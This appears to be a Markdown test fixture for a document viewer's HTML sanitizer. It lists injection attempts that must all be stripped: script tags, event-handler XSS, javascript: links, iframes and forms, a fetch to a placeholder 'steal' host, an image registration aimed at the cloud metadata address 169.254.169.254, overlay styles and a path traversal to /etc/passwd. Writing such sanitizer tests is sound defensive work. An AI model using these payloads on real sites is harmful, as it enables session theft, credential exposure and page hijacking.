# 注入尝试（必须全部被净化）

<script>window.litedoc && window.litedoc.postMessage(JSON.stringify({v:1,method:"registerImages",params:{urls:["http://169.254.169.254/latest/meta-data/"]}}))</script>

<img src=x onerror="fetch('https://example.invalid/steal')">

<a href="javascript:alert(1)">javascript 链接</a>

<a href="https://example.invalid/page" target="_top">应变为复制链接，不导航</a>

<iframe src="https://example.invalid/frame"></iframe>

<object data="https://example.invalid/obj"></object>

<embed src="https://example.invalid/embed">

<form action="https://example.invalid/post" method="post"><input name="x" value="1"><button>提交</button></form>

<meta http-equiv="refresh" content="0;url=https://example.invalid/refresh">

<base href="https://example.invalid/">

<link rel="stylesheet" href="https://example.invalid/remote.css">

<style>
  @import url("https://example.invalid/import.css");
  body { position: fixed; inset: 0; z-index: 99999; }
  .x { background: url("https://example.invalid/bg.png"); }
</style>

<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;background:url(https://example.invalid/cover.png)">覆盖层尝试</div>

<div style="color:red;background-color:#eee;font-size:14px;margin:4px">受控的内联样式应保留</div>

<svg onload="alert(1)"><script>alert(2)</script><circle r="10"/></svg>

<math><mtext><script>alert(3)</script></mtext></math>

<details open ontoggle="alert(4)"><summary>事件属性</summary>内容</details>

<textarea><script>alert(5)</script></textarea>

<!-- 注释与实体 -->
&#x3c;script&#x3e;alert(6)&#x3c;/script&#x3e;

[合法链接](https://example.invalid/ok) 与 ![远程图片](https://example.invalid/pixel.png) 与 ![本地图片](./secret/../../etc/passwd)

```html
<script>围栏中的脚本只是文本</script>
```

<script src="https://example.invalid/remote.js"></script>
